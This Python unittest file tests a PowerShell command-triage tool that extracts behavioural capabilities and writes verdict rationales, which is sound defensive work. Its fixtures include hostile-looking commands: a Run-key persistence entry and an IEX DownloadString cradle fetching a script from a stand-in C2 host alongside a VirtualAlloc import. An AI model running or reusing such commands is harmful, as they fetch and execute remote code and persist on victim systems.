"""Tests for Behavioral Capability Summary and Verdict Rationale extraction."""

from __future__ import annotations

import unittest

from cmd_unmask.models import PayloadNode, Severity, TriageVerdict, UnpackingDAG
from cmd_unmask.unpacker import unmask_command


class TestBehavioralCapabilityExtractor(unittest.TestCase):
    """Verify static non-IOC behavioral capability extraction and model serialization."""

    def test_triage_verdict_defaults_and_to_dict_keys(self) -> None:
        node = PayloadNode(node_id="node_0", text="ipconfig /all", depth=0)
        dag = UnpackingDAG(root_id="node_0", nodes={"node_0": node}, primary_leaf_id="node_0")
        verdict = TriageVerdict(
            source_id="test-1",
            original_command="ipconfig /all",
            primary_unmasked_payload="ipconfig /all",
            dag=dag,
        )
        self.assertEqual(verdict.capabilities, [])
        self.assertEqual(verdict.verdict_rationale, "")
        payload = verdict.to_dict()
        self.assertIn("capabilities", payload)
        self.assertIn("verdict_rationale", payload)
        self.assertEqual(payload["capabilities"], [])
        self.assertEqual(payload["verdict_rationale"], "")

    def test_extract_capabilities_va_audit_pinvoke_and_file_write(self) -> None:
        cmd = (
            "powershell.exe -NoP -Command \"\n"
            "$code = @'\n"
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public class NetAudit {\n"
            "  [DllImport(\"Netapi32.dll\", CharSet = CharSet.Unicode)]\n"
            "  public static extern int NetGetJoinInformation(string server, out IntPtr domain, out int status);\n"
            "}\n"
            "'@\n"
            "Add-Type -TypeDefinition $code;\n"
            "Get-ComputerInfo | Out-File -FilePath C:\\Temp\\audit_out.txt\n"
            "\""
        )
        verdict = unmask_command(cmd, source_id="va-cap-1")
        self.assertEqual(verdict.severity, Severity.BENIGN)
        self.assertEqual(verdict.risk_score, 0)
        joined = "\n".join(verdict.capabilities)
        self.assertIn("Netapi32.dll", joined)
        self.assertIn("NetGetJoinInformation", joined)
        self.assertIn("C:\\Temp\\audit_out.txt", joined)

    def test_extract_capabilities_registry_process_and_network(self) -> None:
        cmd = (
            "powershell.exe -NoP -Command \""
            "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Temp\\run.exe /f; "
            "New-ItemProperty -Path HKCU:\\Software\\TestApp -Name Mode -Value 1; "
            "Start-Process C:\\Temp\\run.exe; "
            "(New-Object System.Net.WebClient).DownloadString('http://updates.example.invalid/stage.ps1')"
            "\""
        )
        verdict = unmask_command(cmd, source_id="cap-2")
        joined = "\n".join(verdict.capabilities)
        self.assertIn("Registry", joined)
        self.assertIn("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", joined)
        self.assertIn("HKCU:\\Software\\TestApp", joined)
        self.assertIn("Process", joined)
        self.assertIn("Network", joined)

    def test_benign_plain_commands_produce_empty_capabilities(self) -> None:
        for cmd in ("ipconfig /all", "git status"):
            verdict = unmask_command(cmd, source_id="ben-plain")
            self.assertEqual(verdict.capabilities, [])
            self.assertEqual(verdict.risk_score, 0)
            self.assertEqual(verdict.severity, Severity.BENIGN)


class TestVerdictRationale(unittest.TestCase):
    """Verify explicit human-readable verdict rationale across BENIGN and non-benign verdicts."""

    def test_va_audit_baseline_benign_rationale(self) -> None:
        cmd = (
            "powershell.exe -NoP -Command \"\n"
            "$code = @'\n"
            "[DllImport(\"Netapi32.dll\")] public static extern int NetGetJoinInformation(string s, out IntPtr b, out int t);\n"
            "'@\n"
            "Add-Type -TypeDefinition $code\n"
            "\""
        )
        verdict = unmask_command(cmd, source_id="va-rat-1")
        self.assertEqual(verdict.severity, Severity.BENIGN)
        self.assertIn("Authorized VA Audit Baseline", verdict.verdict_rationale)
        self.assertIn("Netapi32.dll", verdict.verdict_rationale)
        self.assertIn("NetGetJoinInformation", verdict.verdict_rationale)

    def test_standard_benign_rationale(self) -> None:
        verdict = unmask_command("ipconfig /all", source_id="ben-rat-1")
        self.assertEqual(verdict.severity, Severity.BENIGN)
        self.assertIn("zero malicious behavioral rules", verdict.verdict_rationale.lower())

    def test_malicious_high_critical_rationale(self) -> None:
        cmd = (
            "powershell.exe -NoP -Command \""
            "Add-Type '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);'; "
            "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example/inj.ps1')"
            "\""
        )
        verdict = unmask_command(cmd, source_id="mal-rat-1")
        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
        self.assertIn("T1055", verdict.verdict_rationale)
        self.assertIn("T1105", verdict.verdict_rationale)

    def test_unknown_empty_input_rationale(self) -> None:
        verdict = unmask_command("   ", source_id="empty-rat-1")
        self.assertEqual(verdict.severity, Severity.UNKNOWN)
        self.assertTrue(len(verdict.verdict_rationale) > 0)


if __name__ == "__main__":
    unittest.main()
